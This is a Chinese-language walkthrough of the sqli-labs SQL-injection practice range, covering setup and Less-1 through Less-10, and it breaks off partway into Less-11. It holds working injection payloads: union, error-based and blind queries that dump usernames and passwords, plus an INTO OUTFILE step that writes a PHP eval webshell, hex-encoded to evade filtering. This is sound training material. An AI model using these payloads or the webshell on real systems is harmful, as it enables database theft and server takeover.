# sqli-labs 靶场通关笔记

> **分章阅读（新结构）**：本文件保留为原始完整笔记，便于对照与回溯。建议从 [SQLi-Labs 分章索引](notes/sqli-labs/README.md) 阅读拆分后的章节： [环境与基础](notes/sqli-labs/00-overview.md) · [Less-1–10](notes/sqli-labs/01-less-01-10.md) · [Less-11–20](notes/sqli-labs/02-less-11-20.md) · [Less-21–30](notes/sqli-labs/03-less-21-30.md) · [Less-31–40](notes/sqli-labs/04-less-31-40.md) · [Less-41–50](notes/sqli-labs/05-less-41-50.md) · [Less-51–65](notes/sqli-labs/06-less-51-65.md) · [速查与防御](notes/sqli-labs/07-reference-defense.md)。

> **适用范围**：仅限本地 / 授权靶场练习。sqli-labs 是故意存在 SQL 注入漏洞的教学平台，请勿对未授权系统使用文中手法。\
> **项目地址**：<https://github.com/Audi-1/sqli-labs>
>
> 在线靶场：<https://ctf.hscsec.cn/range/sqli-labs/>

***

## 1. 概述

### 什么是 SQL 注入

当 Web 应用向后台数据库传递 <font style="color:#DF2A3F;">SQL 语句</font> 进行数据库操作时，如果对用户输入的参数<font style="color:#DF2A3F;">没有经过严格的过滤处理</font>，那么攻击者就可以构造特殊的 SQL 语句，直接输入数据库引擎执行，获取或修改数据库中的数据。

### 系统库

在<font style="color:#DF2A3F;">5.0</font>以上的大版本提供了访问数据库元数据（sql 服务自带的数据库）的方式。

\*\*<font style="color:#DF2A3F;">information_schema </font>\*\***库**：是信息数据库，其中保存着关于 MySQL 服务器所维护的所有其他数据库的信息(例如数据库或表的名称，列的数据类型或访问权限)

SCHEMATA 表：提供了所有数据库信息。

* schema_name：数据库名

TABLES 表：提供了所以表的信息。

* table_name：表名
* table_schema：表所属的数据库

COLUMNS 表：详细描述了每张表的所有列的信息。

* column_name：字段名
* table_name：字段所属的表名
* table_schema：表所属的数据库名

**performance_schema 库**：具有87张表，MySQL 5.5开始新增的一个数据库，主要用于收集数据库服务器性能参数。内存数据库，数据放在内存中直接操作的数据库。相对于磁盘，内存的数据读写速度要高出几个数量级。

**mysql 库**：是核心数据库，类似于 sql server中的 master 表，主要负责存储数据库的用户（账户）信息、权限设置、关键字等 mysql 自己需要使用的控制和管理信息。常用举例：在 mysql.user（5.7版本之前）表中修改root 用户的密码 sys 库

**sys 库**：sys 库是 MySQL 5.7 增加的系统数据库，这个库是通过视图的形式把 information_schema 和 performance_schema 结合起来，查询出更加令人容易理解的数据。可以查询谁使用了最多的资源，哪张表访问最多等。

sqli-labs（作者 Audi-1）是经典的 SQL 注入练习平台，覆盖报错注入、联合查询、布尔/时间盲注、POST、Header、二次注入、过滤绕过、堆叠查询等场景。关卡目录一般为 Less-1 ~ Less-65（含部分 `Less-25a` 等变体）。

| 项目 | 说明 |
| --- | --- |
| 仓库 | <https://github.com/Audi-1/sqli-labs> |
| 技术栈 | PHP + MySQL/MariaDB |
| 数据库名（默认） | `security` |
| 常见练习表 | `users`（含 `id/username/password` 等） |
| 官方说明 | 见仓库 `readme.md` |

### 官方覆盖的知识点分类

| 类别 | 含义（中文） |
| --- | --- |
| Error Based（Union） | 报错 / 联合查询（字符串、整型等） |
| Double Injection | 双查询报错类注入 |
| Blind Boolean / Time | 布尔盲注 / 时间盲注 |
| Update / Insert | 更新、插入语句中的注入 |
| Header Injection | Referer / User-Agent / Cookie |
| Second Order | 二次注入 |
| WAF / Blacklist Bypass | 绕过注释、OR/AND、空格、UNION 等过滤 |
| addslashes / escape | 转义函数绕过（含特殊条件） |
| Stacked queries | 堆叠查询 |
| Challenge（约 54–65） | 限次数取 key 等综合题 |

***

## 2. 安装步骤

### 2.1 环境要求

* PHP（传统环境常用 5.x；也有社区 PHP7+ 适配版），推荐使用 PHP 5.3.29。
* MySQL 或 MariaDB
* Apache / Nginx
* 浏览器；建议配合 Burp Suite

> 注意：原版大量使用已弃用的 `mysql_*` 函数，**PHP 7+ 默认不可用**。若本机是新 PHP，请用 Docker 镜像，或找标注支持 PHP7 的 fork。

### 2.2 方式一：源码 + phpStudy / LAMP（传统）

```bash
git clone https://github.com/Audi-1/sqli-labs.git
# 将目录放到网站根目录，例如 /var/www/html/sqli-labs 或 phpStudy 的 WWW
```

1. 编辑数据库账号文件：

```latex
sqli-labs/sql-connections/db-creds.inc
```

![1789965066682-0679b630-ab37-4298-935c-bddce6658a5a.png](./img/285943702/1789965066682-0679b630-ab37-4298-935c-bddce6658a5a-795269.png)

常见字段含义：

| 配置项 | 中文含义 | 示例 |
| --- | --- | --- |
| `$dbuser` | 数据库用户名 | `root` |
| `$dbpass` | 数据库密码 | `root` / 空 / `toor` |
| `$dbname` | 库名（部分文件） | `security` |
| `$host` | 数据库主机 | `localhost` |

2. 浏览器访问：

```latex
http://127.0.0.1/sqli-labs/
```

3. 点击页面上的 **Setup/resetDB**（或类似「重建数据库」链接），创建库表并导入数据。

![1789965025945-39b7f378-6e36-4733-83fa-03dd3a694bec.png](./img/285943702/1789965025945-39b7f378-6e36-4733-83fa-03dd3a694bec-427588.png)

4. 再点各 **Lesson / Less-x** 开始练习。

### 2.3 方式二：Docker（推荐，少踩 PHP 版本坑）

社区常见用法示例（镜像名可能因维护者而异，请以实际拉取结果为准）：

```bash
# 示例：部分环境可直接使用已有镜像
docker pull acgpiano/sqli-labs
docker run -dt --name sqli-labs -p 80:80 acgpiano/sqli-labs
```

访问：

```latex
http://127.0.0.1:80/
```

![1790873545326-9dabb557-c990-4a5d-98a0-e0676e8bb21e.png](./img/285943702/1790873545326-9dabb557-c990-4a5d-98a0-e0676e8bb21e-359676.png)

### 2.4 验证安装

* 首页能打开各 Less 链接
* Less-1 访问 `?id=1` 能显示用户信息

![1789965190706-358674df-6417-4f4b-9dd4-f1f0d75cae2b.png](./img/285943702/1789965190706-358674df-6417-4f4b-9dd4-f1f0d75cae2b-794761.png)

* `?id=1'` 在报错关应出现 SQL 语法错误信息（便于学习）

***

## 3. 基本使用

### 3.1 推荐练习顺序

1. **Less-1～10**：GET 报错 / 联合 / 盲注基础
2. **Less-11～17**：POST、更新、头注入入门
3. **Less-18～22**：UA / Referer / Cookie / 二次相关
4. **Less-23～28**：过滤、注释、空格等绕过
5. **Less-29～37**：更复杂过滤与转义
6. **Less-38～53**：堆叠、进阶变体
7. **Less-54～65**：限次 Challenge

### 3.2 通用手注流程（有回显时）

1. 判断注入点与闭合：`' " ) )` 等
2. 注释尾巴：`--+` 或 `%23`（`#`）
3. `order by n` 判列数
4. `union select` 找回显位
5. 查库 → 表 → 列 → 数据（`information_schema`）

### 3.3 数据库结构（默认 security）

练习中最常用：

| 对象 | 说明 |
| --- | --- |
| 库 `security` | 默认靶场库 |
| 表 `users` | 用户表 |
| 字段 | `id`, `username`, `password` 等 |

***

## 4. 重要参数与 SQL 片段说明

| 名称 | 中文含义 |
| --- | --- |
| `id` | 最常见的 GET 注入参数 |
| `uname` / `passwd` | POST 登录类关卡用户名/密码参数 |
| `' / " / )` | 字符串或括号闭合符 |
| `--+` / `#` | 注释掉后面原 SQL |
| `order by n` | 探测查询列数 |
| `union select` | 联合查询，合并结果集 |
| `information_schema` | MySQL 元数据库（库名/表名/列名） |
| `group_concat()` | 把多行拼成一个字符串便于一次回显 |
| `updatexml()` / `extractvalue()` | 报错注入常用函数 |
| `sleep(n)` / `benchmark()` | 时间盲注延时 |
| `substr` / `ascii` / `length` | 盲注逐字符判断 |
| `0x...` 十六进制 | 绕过引号被转义时写字符串 |

### 常用的系统函数

1. version()——MySQL 版本
2. user()——数据库用户名
3. database()——数据库名
4. @@datadir——数据库路径
5. @@version_compile_os——操作系统版本

### 常用的字符串连接函数

1. concat(str1,str2,...)——没有分隔符地连接字符串
2. concat_ws(separator,str1,str2,...)——含有分隔符地连接字符串
3. group_concat(str1,str2,...)——连接一个组的所有字符串，并以逗号分隔每一条数据

***

## 5. 通关详解（按关卡类型）

> 下列为**教学向标准思路与示例 payload**。不同 PHP/MySQL 版本报错文案可能不同；以本地回显为准。\
> 注释在 URL 中常用 `--+`（`--` 后需要空格）或 `%23`。

***

### Basic Challenges 基本挑战

### Less-1：GET · 单引号字符型 · 报错 / 联合注入

#### 关卡信息

| 项目 | 说明 |
| --- | --- |
| 路径 | `/Less-1/?id=1` |
| 注入方式 | GET |
| 类型 | 字符型（单引号包裹） |
| 有无报错回显 | 有（语法错误会直接显示） |
| 典型 SQL 形态 | `... WHERE id='$id' LIMIT 0,1` |

#### 源码逻辑（理解用）

参数 `$id` 被拼进带**单引号**的 SQL，未做有效过滤。输入 `'` 可破坏语句结构，从而注入。

#### 解题步骤

**1）确认注入点**

```latex
?id=1
?id=1'
```

* `id=1`：正常显示用户名/密码一类信息
* `id=1'`：页面出现 MySQL 语法错误 → 存在注入，且为字符型

![1789966095143-76ae153b-8390-4e94-b1f9-291ee6f51629.png](./img/285943702/1789966095143-76ae153b-8390-4e94-b1f9-291ee6f51629-594198.png)

![1789966112922-3b1f63b6-c53f-4214-9547-4f213e670f9f.png](./img/285943702/1789966112922-3b1f63b6-c53f-4214-9547-4f213e670f9f-396741.png)

**2）判断列数**

```latex
?id=1' order by 1--+
?id=1' order by 2--+
?id=1' order by 3--+
?id=1' order by 4--+
```

* `order by 3` 成功、`order by 4` 报错 → 查询结果为 **3 列**

![1789966285916-c219ebc0-2565-41ca-a4d4-b001a521be73.png](./img/285943702/1789966285916-c219ebc0-2565-41ca-a4d4-b001a521be73-919124.png)

![1789966307693-0482bb98-b952-43f6-a16f-a57642d04dc4.png](./img/285943702/1789966307693-0482bb98-b952-43f6-a16f-a57642d04dc4-776202.png)

**3）找显示位（联合查询）**

用不存在的 id，让原查询无结果，只显示 `union` 的结果：

```latex
?id=-1' union select 1,2,3--+
```

观察页面哪一列数字出现在「用户名/密码」位置（常见为第 2、第 3 列）。

![1789967434187-8d2e782e-47f3-4af8-8933-65f46b5020b8.png](./img/285943702/1789967434187-8d2e782e-47f3-4af8-8933-65f46b5020b8-595338.png)

**4）查库名**

```latex
?id=-1' union select 1,database(),version()--+
```

![1789967713219-304da107-3efa-484d-a489-e9d3f4614a7b.png](./img/285943702/1789967713219-304da107-3efa-484d-a489-e9d3f4614a7b-579336.png)

**5）查表名**

```latex
?id=-1' union select 1,group_concat(table_name),3
from information_schema.tables
where table_schema='security'--+
```

（写在一行 URL 里即可，此处换行仅方便阅读。）

![1789967857834-c957949d-fa5f-4f5e-b091-78c0f81f6dfe.png](./img/285943702/1789967857834-c957949d-fa5f-4f5e-b091-78c0f81f6dfe-708118.png)

**6）查列名**

```latex
?id=-1' union select 1,group_concat(column_name),3
from information_schema.columns
where table_schema='security' and table_name='users'--+
```

![1789967976091-6b04deea-8997-4075-bf36-66d86f876293.png](./img/285943702/1789967976091-6b04deea-8997-4075-bf36-66d86f876293-604208.png)

**7）查数据**

```latex
?id=-1' union select 1,group_concat(username,0x3a,password),3
from users--+
```

`0x3a` 是字符 `:` 的十六进制，用来拼接「用户名:密码」。

![1789968127978-1a7f2f62-3791-41ed-8e31-e61497692d11.png](./img/285943702/1789968127978-1a7f2f62-3791-41ed-8e31-e61497692d11-921656.png)

#### 要点小结

| 点 | 说明 |
| --- | --- |
| 闭合 | 先写 `'` 关掉原引号 |
| 注释 | `--+` 或 `%23` 注释掉后面的 `'` 和 `LIMIT` |
| `-1'` | 避免原查询有行，干扰 union 回显 |

***

### Less-2：GET · 整型注入

#### 关卡信息

| 项目 | 说明 |
| --- | --- |
| 路径 | `/Less-2/?id=1` |
| 类型 | 数字型（SQL 中 id 无引号） |
| 典型 SQL 形态 | `... WHERE id=$id LIMIT 0,1` |

#### 与 Less-1 的区别

整型注入**不需要**用 `'` 闭合字符串。输入 `'` 也可能报错，但构造 payload 时一般写成：

```latex
?id=1 order by 3--+
```

而不是 `1' order by 3--+`。

#### 解题步骤

**1）探测**

```latex
?id=1
?id=1 and 1=1--+
?id=1 and 1=2--+
```

真/假条件导致回显不同，或直接报错，可确认注入。

![1789975768648-73c8d7e5-04df-4f56-a703-76187b7a0f39.png](./img/285943702/1789975768648-73c8d7e5-04df-4f56-a703-76187b7a0f39-209469.png)

![1789975789354-6adca094-c5fe-4743-b371-b9b9e49921c2.png](./img/285943702/1789975789354-6adca094-c5fe-4743-b371-b9b9e49921c2-353603.png)

**2）列数与联合**

```latex
?id=1 order by 3--+
?id=-1 union select 1,2,3--+
```

![1789975862749-93559211-619f-49e4-a4a3-ea3789a18d92.png](./img/285943702/1789975862749-93559211-619f-49e4-a4a3-ea3789a18d92-602843.png)

**3）取数（示例）**

```latex
?id=-1 union select 1,database(),3--+
?id=-1 union select 1,group_concat(username,0x3a,password),3 from users--+
```

![1789975902731-a94117d4-84e0-4e5c-bfcb-6c7e4680382c.png](./img/285943702/1789975902731-a94117d4-84e0-4e5c-bfcb-6c7e4680382c-524947.png)

![1789975953093-0999fad5-9fa4-4c29-9870-8d620fc5b481.png](./img/285943702/1789975953093-0999fad5-9fa4-4c29-9870-8d620fc5b481-700429.png)

#### 要点小结

数字型：`and` / `or` / `union` 直接跟在数字后；不要多加一层字符串引号（除非你在测报错信息）。

***

### Less-3：GET · 单引号 + 括号 `')`

#### 关卡信息

| 项目 | 说明 |
| --- | --- |
| 典型 SQL 形态 | `... WHERE id=('$id') LIMIT 0,1` |
| 闭合方式 | `'` 之后还要补 `)` |

#### 如何判断闭合

```latex
?id=1'
?id=1')
?id=1')--+
```

能消除报错或逻辑正确时，说明需要 `')` 闭合。

![1789976561281-a6cc2317-57fa-438d-9294-1c7b3ab5ef1d.png](./img/285943702/1789976561281-a6cc2317-57fa-438d-9294-1c7b3ab5ef1d-305401.png)

#### 解题步骤

```latex
?id=1') order by 3--+
?id=-1') union select 1,2,3--+
?id=-1') union select 1,database(),3--+
?id=-1') union select 1,group_concat(username,0x3a,password),3 from users--+
```

![1789976667449-922243dd-4f2d-4f62-b004-e82f3b363583.png](./img/285943702/1789976667449-922243dd-4f2d-4f62-b004-e82f3b363583-195792.png)

#### 要点小结

原 SQL 用了 `('$id')` 时，注入串形态为：

```latex
$payload = -1') union select 1,2,3--+
```

对应拼出：`id=('-1') union select 1,2,3-- ...)`，前半合法闭合，后面被注释。

***

### Less-4：GET · 双引号 + 括号 `")`

#### 关卡信息

| 项目 | 说明 |
| --- | --- |
| 典型 SQL 形态 | `... WHERE id=("$id") LIMIT 0,1` |
| 闭合方式 | `")` |

#### 解题步骤

```latex
?id=1"
?id=1")--+
?id=1") order by 3--+
?id=-1") union select 1,2,3--+
?id=-1") union select 1,group_concat(username,0x3a,password),3 from users--+
```

![1789977104499-9bc54888-29dd-48ef-8989-3086762ed667.png](./img/285943702/1789977104499-9bc54888-29dd-48ef-8989-3086762ed667-620142.png)

![1789977174706-2ea23abe-9bed-4d5e-9ba4-55b6bddd60f2.png](./img/285943702/1789977174706-2ea23abe-9bed-4d5e-9ba4-55b6bddd60f2-637552.png)

#### 要点小结

与 Less-3 相同思路，只是引号从单引号换成双引号。

***

### Less-5：GET · 单引号 · 双查询 / 报错型（弱数据回显）

#### 关卡信息

| 项目 | 说明 |
| --- | --- |
| 回显特点 | 成功时多显示固定文案（如 You are in……），**不一定**回显 username/password 字段 |
| 闭合 | 单引号 `'` |
| 常用手法 | 报错注入；也可布尔/时间盲注 |

#### 现象对比

| 输入 | 可能现象 |
| --- | --- |
| `?id=1` | You are in…… |
| `?id=1'` | 数据库错误信息 |
| `?id=1' and 1=1--+` | You are in…… |
| `?id=1' and 1=2--+` | 无 “in” 或另一种提示 |

字段联合回显可能「看不到 2、3 列内容」，故改用**报错把数据打到错误消息里**。

#### 报错注入示例

```latex
?id=1' and updatexml(1,concat(0x7e,(select database()),0x7e),1)--+
```

![1789977601168-263dacae-5ecf-4bda-98ee-012ae043e131.png](./img/285943702/1789977601168-263dacae-5ecf-4bda-98ee-012ae043e131-495298.png)

```latex
?id=1' and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e),1)--+
```

![1789977688629-8add9612-378f-46af-948a-ecf6748bbce5.png](./img/285943702/1789977688629-8add9612-378f-46af-948a-ecf6748bbce5-358163.png)

```latex
?id=1' and updatexml(1,concat(0x7e,(select group_concat(username,0x3a,password) from users),0x7e),1)--+
```

![1789977774620-8929daf5-a8ba-4d8c-94df-449b92f26908.png](./img/285943702/1789977774620-8929daf5-a8ba-4d8c-94df-449b92f26908-244803.png)

也可试 `extractvalue(1,concat(0x7e,(...)))`。注意报错函数一次能回显的长度有限，数据长时需 `limit` 分段。

#### 双查询报错（部分环境）

利用子查询返回多行触发报错，从而带出数据（具体语法依赖 MySQL 版本与题目写法）。上手优先掌握 `updatexml` / `extractvalue` 即可。

#### 要点小结

| 点 | 说明 |
| --- | --- |
| 与 Less-1 差异 | 页面不靠 union 显示位吃数据 |
| 核心技能 | 报错注入读数据 |
| 备选 | 布尔/时间盲注（同 Less-8/9 思路） |

***

### Less-6：GET · 双引号 · 同 Less-5 弱回显

#### 关卡信息

与 Less-5 类似，闭合改为**双引号**。

#### 解题步骤

```sql
?id=1"
?id=1" and updatexml(1,concat(0x7e,(select database()),0x7e),1)--+
?id=1" and updatexml(1,concat(0x7e,(select group_concat(username,0x3a,password) from users),0x7e),1)--+
```

![1789978737188-4cb95ba7-c209-43fa-951b-dfda97996d9b.png](./img/285943702/1789978737188-4cb95ba7-c209-43fa-951b-dfda97996d9b-666322.png)

![1789978852219-71757bf7-b8fd-471b-93d0-17644ae9ff9e.png](./img/285943702/1789978852219-71757bf7-b8fd-471b-93d0-17644ae9ff9e-500230.png)

#### 要点小结

先确认 `"..."` 闭合，再套报错函数；其余与 Less-5 相同。

***

### Less-7：GET · 文件写入类（outfile）提示

#### 关卡信息

| 项目 | 说明 |
| --- | --- |
| 页面提示 | 常与 dumpfile / outfile 相关 |
| 闭合 | 多为 `'))` 一类（以实际报错为准） |
| 目标 | 理解「注入写文件」；权限不足时仍可用联合/报错取数 |

#### 判断闭合（示例）

```latex
?id=1'
?id=1')
?id=1'))
?id=1'))--+
```

![1789979071053-38ec67f0-3e63-4344-8b03-be3c1069447f.png](./img/285943702/1789979071053-38ec67f0-3e63-4344-8b03-be3c1069447f-292377.png)

#### <font style="color:rgb(0, 0, 0);">写入文件配置（使用条件）</font>

**secure-file-priv**

如果文件导入不成功，确认 MySQL 配置文件 my.ini 下存在 **secure-file-priv**

**secure-file-priv** 参数是用来限制 LOAD DATA, SELECT … OUTFILE, and LOAD_FILE() 传到哪个指定目录的

* secure_file_priv 的值为 null ，表示限制 mysqld 不允许导入|导出
* secure_file_priv 的值为/tmp/，表示限制 mysqld 的导入|导出只能发生在/tmp/目录下
* secure_file_priv 的值没有具体值时，表示不对 mysqld 的导入|导出做限制

MySQL 使用以下命令查看是否打开文件写入开关

```sql
show global variables like '%secure%';
```

![1789980168637-cbfc622a-2634-4b63-a532-146b4af6e8d1.png](./img/285943702/1789980168637-cbfc622a-2634-4b63-a532-146b4af6e8d1-550968.png)

修改 my.ini 添加 secure-file-priv 参数,没有填具体值表示不做限制（这样做其实很危险）

![1789980434046-a7b39ad8-b7e5-4d66-bc9a-7513cadaf8a8.png](./img/285943702/1789980434046-a7b39ad8-b7e5-4d66-bc9a-7513cadaf8a8-819199.png)

重启 MySQL 即可。

#### 写文件思路（需权限）

outfile 后面的路径必须真实存在缺正确才能生效。

```latex
?id=-1')) union select 1,'<?php phpinfo(); ?>',3 into outfile '/var/www/html/shell.php'--+
```

```latex
?id=-1')) union select 1,'<?php phpinfo(); ?>',3 into outfile 'C:\\Users\\Windows10\\Downloads\\phpstudy_pro\\WWW\\sqli-labs\\Less-7\\phpinfo.php'--+
```

建议最好使用加密编码过的，以防拦截。

0x后面是<?php phpinfo(); ?>的十六进制编码(Hex编码)

编码网站：<http://www.hiencode.com/hex.html>

```latex
?id=-1')) union select 1,'0x3c3f70687020706870696e666f28293b203f3e',3 into outfile 'C:\\Users\\Windows10\\Downloads\\phpstudy_pro\\WWW\\sqli-labs\\Less-7\\phpinfo.php'--+
```

![1789980720363-de8a8e79-921b-46f6-a781-9290a7def05d.png](./img/285943702/1789980720363-de8a8e79-921b-46f6-a781-9290a7def05d-857290.png)

访问写入的文件即可看到生效了。

![1789980790853-b9f298b9-ba86-466a-a397-bea1d37e4aba.png](./img/285943702/1789980790853-b9f298b9-ba86-466a-a397-bea1d37e4aba-863563.png)

上传一句话木马

```latex
?id=-1')) union select 1,'<?php @eval($_POST["cmd"]); ?>',3 into outfile 'C:\\Users\\Windows10\\Downloads\\phpstudy_pro\\WWW\\sqli-labs\\Less-7\\webshell.php'--+


#编码后的语句
?id=-1')) union select 1,'0x3c3f70687020406576616c28245f504f53545b22636d64225d293b203f3e',3 into outfile 'C:\\Users\\Windows10\\Downloads\\phpstudy_pro\\WWW\\sqli-labs\\Less-7\\webshell.php'--+
```

![1789981816637-7cbb4378-a691-4c65-9826-17508955c29b.png](./img/285943702/1789981816637-7cbb4378-a691-4c65-9826-17508955c29b-666536.png)

通过蚁剑去连接，获取 webshell。

![1789981901014-765cdf94-24a8-44fd-a351-7a1025994ada.png](./img/285943702/1789981901014-765cdf94-24a8-44fd-a351-7a1025994ada-602441.png)

![1789981913837-4c53dcea-2ae9-4594-8750-b05b5ceab083.png](./img/285943702/1789981913837-4c53dcea-2ae9-4594-8750-b05b5ceab083-756880.png)

**常见失败原因：**

* `secure_file_priv` 限制路径
* 数据库账号无 `FILE` 权限
* Web 路径猜错或不可写

#### 无写权限时

按 Less-1/3 方式联合或报错取 `users` 数据即可完成本关学习目标（读数据 + 理解 outfile 条件）。

#### 要点小结

生产环境应禁止高权限、禁止随意 `outfile`；本关重点是**条件与风险**，不是强求一定写出 shell。

***

### Less-8：GET · 布尔盲注

#### 关卡信息

| 项目 | 说明 |
| --- | --- |
| 回显 | 真/假页面不同（有/无 You are in 等），无详细数据字段 |
| 报错 | 通常不暴露有用 SQL 错误 |
| 手法 | 布尔盲注（逐字猜） |

#### 解题步骤

**1）确认布尔差异**

```latex
?id=1' and 1=1--+
?id=1' and 1=2--+
```

记下「成功页」与「失败页」的区别（文案、长度、关键词）。

![1789982826663-858f933f-e2a2-49dd-9a50-b898bfd115d6.png](./img/285943702/1789982826663-858f933f-e2a2-49dd-9a50-b898bfd115d6-289762.png)

![1789982839812-74485606-e082-4b3b-987e-cee686920951.png](./img/285943702/1789982839812-74485606-e082-4b3b-987e-cee686920951-222660.png)

**2）猜库名长度**

```latex
?id=1' and length(database())=8--+
```

（`security` 长度为 8，可用来验证方法。）

![1789983026640-4fedb733-8bc3-4748-a558-068038d443d1.png](./img/285943702/1789983026640-4fedb733-8bc3-4748-a558-068038d443d1-980609.png)

**3）逐字符猜库名**

```latex
?id=1' and substr(database(),1,1)='s'--+
?id=1' and substr(database(),2,1)='e'--+
```

或用 `ascii(substr(database(),1,1))>115` 做二分。

![1789983125972-4d7da058-419b-4978-9ff5-9962d6211abb.png](./img/285943702/1789983125972-4d7da058-419b-4978-9ff5-9962d6211abb-552405.png)

![1789983155927-f974eb9c-4e62-4b1b-a208-e0e283ea7c3b.png](./img/285943702/1789983155927-f974eb9c-4e62-4b1b-a208-e0e283ea7c3b-047431.png)

**4）猜表名 / 列名 / 数据**

逻辑相同，把子查询换成：

```sql
(select table_name from information_schema.tables where table_schema=database() limit 0,1)
(select column_name from information_schema.columns where table_name='users' limit 0,1)
(select password from users limit 0,1)
```

猜解表名长度：

```latex
?id=1' and length((select table_name from information_schema.tables where table_schema=database() limit 0,1))=6 --+
```

![1790058078191-b22a55d4-fce6-4e00-906f-605983911db3.png](./img/285943702/1790058078191-b22a55d4-fce6-4e00-906f-605983911db3-956645.png)

猜解表名第一个字符（假设表名是 users）：

```latex
?id=1' and substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1)='u'--+
```

(如果页面显示 `You are in`，说明第一个字符是 'u'，否则继续换字母尝试)

判断长度后，再逐字符猜：

```plain
?id=1' and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))>120 --+
```

爆字段名

```plain
?id=1' and length((select column_name from information_schema.columns where table_name='users' limit 0,1))>5 --+

?id=1' and ascii(substr((select column_name from information_schema.columns where table_name='users' limit 0,1),1,1))>100 --+
```

![1790059217219-d5f48057-b487-4f6c-9b9a-8ad774d0fa03.png](./img/285943702/1790059217219-d5f48057-b487-4f6c-9b9a-8ad774d0fa03-953979.png)

爆字段内容

```plain
?id=1' and length((select password from users limit 0,1))=32 --+

?id=1' and ascii(substr((select password from users limit 0,1),1,1))>97 --+
```

#### BurpSuite 抓包

获取数据库名

```plain
?id=1' and substr(database(),1,1)='s'--+
```

![1790060440631-b3a439df-dbc6-43d6-853c-b384591aa171.png](./img/285943702/1790060440631-b3a439df-dbc6-43d6-853c-b384591aa171-997828.png)

通过 BurpSuite 抓包，并发送到 Intruder。攻击类型选择“ClusterBomb”（集束炸弹）。并且选择添加好 payload 点。

![1790060489265-17772813-c19a-4727-8d63-3ce58774dd6f.png](./img/285943702/1790060489265-17772813-c19a-4727-8d63-3ce58774dd6f-255525.png)

在 Payload set 1 这里选择 Numbers（数值），并且 From 写 1，To 写 128，Step（增量）写 1。

![1790060589038-bf9a4eb7-06f6-4257-b900-070a0965dec6.png](./img/285943702/1790060589038-bf9a4eb7-06f6-4257-b900-070a0965dec6-709025.png)

在 Payload set 2 这里选择 Brute forcer（蛮力），下面的 Min length（最短）写 1，Max length（最长）写 1。

![1790060683165-32e9032a-ab59-4ad8-bc6a-550ccab675ef.png](./img/285943702/1790060683165-32e9032a-ab59-4ad8-bc6a-550ccab675ef-622082.png)

开始攻击

![1790060820768-23bd6b1e-f35f-4a1c-b5e8-2cc98ed46d8e.png](./img/285943702/1790060820768-23bd6b1e-f35f-4a1c-b5e8-2cc98ed46d8e-607953.png)

点击 Filter（过滤器），在下面的 Filter by search term（按搜索字词过滤）里面输入“You are in”。点击空白位置即可点掉。

![1790060859515-fb17e338-3441-4947-8d82-26c002103ca5.png](./img/285943702/1790060859515-fb17e338-3441-4947-8d82-26c002103ca5-789865.png)

点击一次 Payload1，按顺序排序，即可拼凑出数据库名为“security”。

![1790060970313-5145192a-e0d8-4f6c-b843-8ef053dad578.png](./img/285943702/1790060970313-5145192a-e0d8-4f6c-b843-8ef053dad578-171507.png)

以此类推，就可以查询出所有的表名与字段名。

#### 要点小结

| 点 | 说明 |
| --- | --- |
| 核心 | 用真假页当「1 bit」信息 |
| 效率 | 手注慢，练习时可用 Python 二分 |
| 闭合 | 本关一般为 `'` |

***

### Less-9：GET · 时间盲注（单引号）

#### 关卡信息

| 项目 | 说明 |
| --- | --- |
| 回显 | 真假页面**几乎一样** |
| 判断依据 | 响应是否明显变慢（`sleep`） |
| 闭合 | 单引号 `'` |

#### 解题步骤

**1）确认延时可用**

```latex
?id=1' and sleep(5)--+
?id=1' and if(1=1,sleep(5),0)--+
?id=1' and if(1=2,sleep(5),0)--+
```

若 `1=1` 时明显等待、`1=2` 时很快，说明时间盲注成立。

![1790063829014-4b8bbb56-b0ad-47ae-a581-d8a9565f10fc.png](./img/285943702/1790063829014-4b8bbb56-b0ad-47ae-a581-d8a9565f10fc-008615.png)

**2）猜库名（示例）**

```latex
?id=1' and if(length(database())=8,sleep(3),0)--+
?id=1' and if(substr(database(),1,1)='s',sleep(3),0)--+
```

![1790064050798-0582b5ea-0cd1-4efd-afb3-9109704f39a1.png](./img/285943702/1790064050798-0582b5ea-0cd1-4efd-afb3-9109704f39a1-813307.png)

**3）后续**

与布尔盲注相同，把条件换成表名、列名、字段值；用延时代替页面真假。

```plain
?id=1' and if(ascii(substr(database(),1,1))>115, 0, sleep(5))--+
```

![1790064172576-ab858e10-9609-4cd9-90c3-3778483753a3.png](./img/285943702/1790064172576-ab858e10-9609-4cd9-90c3-3778483753a3-656974.png)

爆表名：

```plain
?id=1' and  if(substr((select table_name from information_schema.tables where table_schema='security' limit 0,1),1,1)='e',sleep(5),1) --+
```

爆列名

```plain
?id=1' and  if(substr((select column_name from information_schema.columns where table_name='users' limit 0,1),1,1)>'e',sleep(5),1) --+
```

具体数据

```plain
?id=1' and  If(ascii(substr((select password from users limit 0,1),1,1))<101,sleep(5),1) --+
```

#### 要点小结

| 点 | 说明 |
| --- | --- |
| 网络波动 | `sleep(3~5)` 较易区分；过短易误判 |
| 自动化 | 强烈建议脚本，按字符枚举 |
| 函数 | `sleep()` / `if(条件,sleep(n),0)` |

***

### Less-10：GET · 时间盲注（双引号）

#### 关卡信息

与 Less-9 相同（时间盲注），闭合改为**双引号**。

#### 解题步骤

```latex
?id=1" and sleep(5)--+
?id=1" and if(1=1,sleep(5),0)--+
?id=1" and if(substr(database(),1,1)='s',sleep(3),0)--+
```

取表、列、数据时保持 `"` 闭合与 `--+` 注释即可。

![1790065021513-f761f946-1f6d-449d-90ea-937f2daab9bb.png](./img/285943702/1790065021513-f761f946-1f6d-449d-90ea-937f2daab9bb-539355.png)

![1790065065426-5f764d74-953d-4a83-aa80-4a8cecf92337.png](./img/285943702/1790065065426-5f764d74-953d-4a83-aa80-4a8cecf92337-164350.png)

#### 要点小结

先用 `"` 与 `sleep` 确认通道，再复用 Less-9 的猜解过程。

***

### Less-11：POST · 单引号字符型 · 登录框

#### 关卡信息

| 项目 | 说明 |
| --- | --- |
| 路径 | `/Less-11/` |
| 注入方式 | POST（表单提交） |
| 常见参数 | `uname`（用户名）、`passwd`（密码） |
| 类型 | 字符型（单引号包裹） |
| 有无报错回显 | 有（语法错误常会显示） |
| 典型 SQL 形态 | `... WHERE uname='$uname' AND passwd='$passwd'` |

#### 源码逻辑（理解用）

登录逻辑把用户名、密码直接拼进 SQL，未做有效过滤。在用户名处闭合单引号，即可改写查询条件，实现绕过登录或联合/报错取数。

#### 解题步骤

**1）确认注入点**

在登录框用户名处输入：

```latex
admin'
```

